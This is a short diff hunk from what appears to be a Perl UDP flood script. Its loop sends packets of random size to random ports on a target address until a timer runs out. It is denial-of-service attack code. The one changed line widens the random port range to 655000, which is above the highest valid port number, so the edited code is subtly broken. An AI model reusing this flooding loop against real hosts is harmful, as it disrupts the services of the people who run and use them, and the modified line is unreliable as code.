@@ -46,6 +46,6 @@ print "Stop NULLING With Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
-  $pport = $port ? $port : int(rand(65500))+1;
+  $pport = $port ? $port : int(rand(655000))+1;
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
